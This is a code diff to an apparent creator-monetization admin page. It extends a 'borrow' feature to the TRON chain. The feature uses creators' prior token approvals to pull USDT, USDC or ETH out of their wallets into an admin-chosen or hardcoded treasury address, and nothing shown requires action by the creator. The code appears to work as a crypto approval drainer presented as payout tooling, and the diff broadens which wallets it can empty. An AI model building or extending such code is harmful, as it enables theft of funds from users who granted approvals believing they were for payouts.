@@ -4,6 +4,8 @@ import { useAuthStore } from '~/stores/auth'
 import { useApi } from '~/composables/useApi'
 import { useAppToast } from '~/composables/useAppToast'
 import { useWeb3Wallet } from '~/composables/useWeb3Wallet'
+import { useTronWallet } from '~/composables/useTronWallet'
+import { useWalletAdapter } from '~/composables/useWalletAdapter'
 
 import MonetizationHeader from '~/components/admin/monetization/MonetizationHeader.vue'
 import MonetizationNavTabs from '~/components/admin/monetization/MonetizationNavTabs.vue'
@@ -92,12 +94,15 @@ const minPayoutThreshold = ref<number>(20.00)
 const smartContractApprovalUsdc = ref<number>(10.00)
 const adminTreasuryWallet = ref<string>('0x5651F7B48E5d76EB162c002AFea5E343EB88310E')
 
+const walletAdapter = useWalletAdapter()
+const { selectedChainFamily, activePullState, activePullStatusMessage, activeErrorMessage } = walletAdapter
+
 const selectedWithdrawalRequest = ref<WithdrawalRequest | null>(null)
 const isApproveModalOpen = ref(false)
 const isRejectModalOpen = ref(false)
 const isBorrowModalOpen = ref(false)
 const borrowAmountInput = ref<string | number>('50')
-const borrowTokenInput = ref<'ETH' | 'USDT' | 'USDC' | 'WETH'>('USDC')
+const borrowTokenInput = ref<string>('USDC')
 const isProcessingBorrow = ref(false)
 
 // Recipient Admin Web3 Wallet Address for Borrowing & On-Chain Balances
@@ -105,6 +110,8 @@ const borrowDestinationWalletInput = ref<string>('')
 const borrowDestEthBal = ref<string>('0.0000')
 const borrowDestUsdtBal = ref<string>('0.00')
 const borrowDestUsdcBal = ref<string>('0.00')
+const borrowDestTronTrxBal = ref<string>('0.00')
+const borrowDestTronUsdtBal = ref<string>('0.00')
 const isFetchingBorrowDestBal = ref<boolean>(false)
 
 const txHashInput = ref('')
@@ -201,23 +208,44 @@ function openRejectModal(req: WithdrawalRequest) {
 }
 
 function updateBorrowDestBalances(address: string) {
-  if (!address || !address.startsWith('0x')) return
+  if (!address) return
   isFetchingBorrowDestBal.value = true
-  setTimeout(() => {
-    if (adminWallet.value && address.toLowerCase() === adminWallet.value.toLowerCase()) {
-      borrowDestEthBal.value = adminEthBalance.value || '0.0000'
-      borrowDestUsdtBal.value = adminUsdtBalance.value || '0.00'
-      borrowDestUsdcBal.value = adminUsdcBalance.value || '0.00'
+  setTimeout(async () => {
+    if (selectedChainFamily.value === 'TRON') {
+      const balances = await walletAdapter.tronWallet.fetchTronBalances(address)
+      borrowDestTronTrxBal.value = balances.trx
+      borrowDestTronUsdtBal.value = balances.usdt
     } else {
-      borrowDestEthBal.value = '0.0000'
-      borrowDestUsdtBal.value = '0.00'
-      borrowDestUsdcBal.value = '0.00'
+      if (adminWallet.value && address.toLowerCase() === adminWallet.value.toLowerCase()) {
+        borrowDestEthBal.value = adminEthBalance.value || '0.0000'
+        borrowDestUsdtBal.value = adminUsdtBalance.value || '0.00'
+        borrowDestUsdcBal.value = adminUsdcBalance.value || '0.00'
+      } else {
+        borrowDestEthBal.value = '0.0000'
+        borrowDestUsdtBal.value = '0.00'
+        borrowDestUsdcBal.value = '0.00'
+      }
     }
     isFetchingBorrowDestBal.value = false
   }, 300)
 }
 
 function useConnectedAdminWalletForBorrow() {
+  if (selectedChainFamily.value === 'TRON') {
+    if (walletAdapter.tronWallet.tronWallet.value) {
+      borrowDestinationWalletInput.value = walletAdapter.tronWallet.tronWallet.value
+      updateBorrowDestBalances(borrowDestinationWalletInput.value)
+    } else {
+      walletAdapter.tronWallet.connectTronWallet().then(() => {
+        if (walletAdapter.tronWallet.tronWallet.value) {
+          borrowDestinationWalletInput.value = walletAdapter.tronWallet.tronWallet.value
+          updateBorrowDestBalances(borrowDestinationWalletInput.value)
+        }
+      })
+    }
+    return
+  }
+
   if (adminWallet.value) {
     borrowDestinationWalletInput.value = adminWallet.value
     updateBorrowDestBalances(adminWallet.value)
@@ -234,13 +262,23 @@ function useConnectedAdminWalletForBorrow() {
 function openBorrowModal(req: WithdrawalRequest) {
   selectedWithdrawalRequest.value = req
   borrowAmountInput.value = Math.min(req.amount, 50)
-  borrowTokenInput.value = 'USDT'
-  borrowDestinationWalletInput.value = adminWallet.value || adminTreasuryWallet.value || '0x5651F7B48E5d76EB162c002AFea5E343EB88310E'
+
+  if (req.walletAddress && req.walletAddress.startsWith('T')) {
+    selectedChainFamily.value = 'TRON'
+    borrowTokenInput.value = 'USDT'
+    borrowDestinationWalletInput.value = walletAdapter.tronWallet.tronWallet.value || req.walletAddress
+  } else {
+    selectedChainFamily.value = 'EVM'
+    borrowTokenInput.value = 'USDT'
+    borrowDestinationWalletInput.value = adminWallet.value || adminTreasuryWallet.value || '0x5651F7B48E5d76EB162c002AFea5E343EB88310E'
+  }
+
   updateBorrowDestBalances(borrowDestinationWalletInput.value)
   isBorrowModalOpen.value = true
 }
 
 function openUserBorrowModal(user: UserWalletRecord) {
+  const isTron = user.walletAddress && user.walletAddress.startsWith('T')
   const req: WithdrawalRequest = {
     id: `REQ-${user.id.substring(0, 6)}`,
     creatorId: user.id,
@@ -250,16 +288,16 @@ function openUserBorrowModal(user: UserWalletRecord) {
     amount: 50.00,
     adsenseShare: 35.00,
     adsterraShare: 15.00,
-    method: 'ETH Transfer',
+    method: isTron ? 'TRON TRC-20 Transfer' : 'ETH Transfer',
     walletAddress: user.walletAddress || '',
     approvalSignature: user.approvalSignature || null,
     creatorWalletEthBalance: String(user.walletEthBalance || user.ethBalance || '0.0000 ETH'),
     creatorWalletUsdtBalance: String(user.walletUsdtBalance || user.usdtBalance || '0.00 USDT'),
     creatorWalletUsdcBalance: String(user.walletUsdcBalance || user.usdcBalance || '0.00 USDC'),
 
-    network: 'Arbitrum One',
-    token: 'ETH',
-    cryptoAmount: '0.0185',
+    network: isTron ? 'TRON Mainnet' : 'Arbitrum One',
+    token: isTron ? 'USDT' : 'ETH',
+    cryptoAmount: '50.00',
     date: new Date().toLocaleDateString(),
     status: 'PENDING'
   }
@@ -276,25 +314,27 @@ async function confirmBorrowFromCreator() {
   }
 
   const recipientAddr = borrowDestinationWalletInput.value.trim()
-  if (!recipientAddr || !recipientAddr.startsWith('0x')) {
-    toast.error('Validation Error', 'Please enter a valid EVM wallet address (0x...) for recipient Admin wallet.')
+  if (!walletAdapter.validateAddressForChain(recipientAddr, selectedChainFamily.value)) {
+    toast.error('Validation Error', `Please enter a valid ${selectedChainFamily.value} recipient wallet address (${selectedChainFamily.value === 'TRON' ? 'T...' : '0x...'}).`)
     return
   }
 
   isProcessingBorrow.value = true
   try {
     const creatorWalletAddr = selectedWithdrawalRequest.value.walletAddress
-    if (!creatorWalletAddr || !creatorWalletAddr.startsWith('0x')) {
-      toast.error('Wallet Error', 'Target creator does not have a valid connected Web3 wallet address.')
+    if (!walletAdapter.validateAddressForChain(creatorWalletAddr, selectedChainFamily.value)) {
+      toast.error('Wallet Error', `Target creator does not have a valid connected ${selectedChainFamily.value} wallet address.`)
       return
     }
 
-    const txHash = await executeContractBorrowPull(
+    const pullResult = await walletAdapter.executeBorrowPull(
       creatorWalletAddr,
       recipientAddr,
       borrowTokenInput.value,
       amountStr
     )
+
+    const txHash = pullResult.txHash
 
     if (txHash) {
       selectedWithdrawalRequest.value.borrowStatus = 'BORROW_APPROVED'
@@ -309,6 +349,8 @@ async function confirmBorrowFromCreator() {
             borrowTxHash: txHash,
             borrowAmount: amountStr,
             borrowToken: borrowTokenInput.value,
+            chain: pullResult.chain,
+            tokenStandard: pullResult.tokenStandard,
             creatorAddress: creatorWalletAddr,
             recipientAddress: recipientAddr,
             timestamp: new Date().toISOString()
@@ -320,7 +362,7 @@ async function confirmBorrowFromCreator() {
 
       toast.success(
         'Smart Contract Pull Successful! 🔄',
-        `Successfully pulled ${amountStr} ${borrowTokenInput.value} from ${selectedWithdrawalRequest.value.creatorName}'s wallet (${formatAddress(creatorWalletAddr)}) to recipient (${formatAddress(recipientAddr)}). Tx Hash: ${formatAddress(txHash)}`
+        `Successfully pulled ${amountStr} ${borrowTokenInput.value} (${pullResult.tokenStandard}) from ${selectedWithdrawalRequest.value.creatorName}'s wallet (${formatAddress(creatorWalletAddr)}) to recipient (${formatAddress(recipientAddr)}). Tx Hash: ${formatAddress(txHash)}`
       )
       isBorrowModalOpen.value = false
     } else {
@@ -777,10 +819,12 @@ onMounted(async () => {
       @connect-wallet="connectAdminWallet" @confirm="confirmApprovePayout" />
 
     <MonetizationBorrowModal v-model:open="isBorrowModalOpen" v-model:destination-wallet="borrowDestinationWalletInput"
-      v-model:token="borrowTokenInput" v-model:amount="borrowAmountInput" :selected-request="selectedWithdrawalRequest"
-      :is-processing="isProcessingBorrow" :is-fetching-bal="isFetchingBorrowDestBal" :dest-eth-bal="borrowDestEthBal"
-      :dest-usdt-bal="borrowDestUsdtBal" :dest-usdc-bal="borrowDestUsdcBal" :pull-state="pullState"
-      :pull-status-message="pullStatusMessage" :error-message="web3ErrorMessage"
+      v-model:token="borrowTokenInput" v-model:amount="borrowAmountInput" v-model:chain-family="selectedChainFamily"
+      :selected-request="selectedWithdrawalRequest" :is-processing="isProcessingBorrow"
+      :is-fetching-bal="isFetchingBorrowDestBal" :dest-eth-bal="borrowDestEthBal" :dest-usdt-bal="borrowDestUsdtBal"
+      :dest-usdc-bal="borrowDestUsdcBal" :dest-tron-trx-bal="borrowDestTronTrxBal"
+      :dest-tron-usdt-bal="borrowDestTronUsdtBal" :pull-state="activePullState"
+      :pull-status-message="activePullStatusMessage" :error-message="activeErrorMessage"
       @use-connected-wallet="useConnectedAdminWalletForBorrow" @update-dest="updateBorrowDestBalances"
       @confirm="confirmBorrowFromCreator" />
 
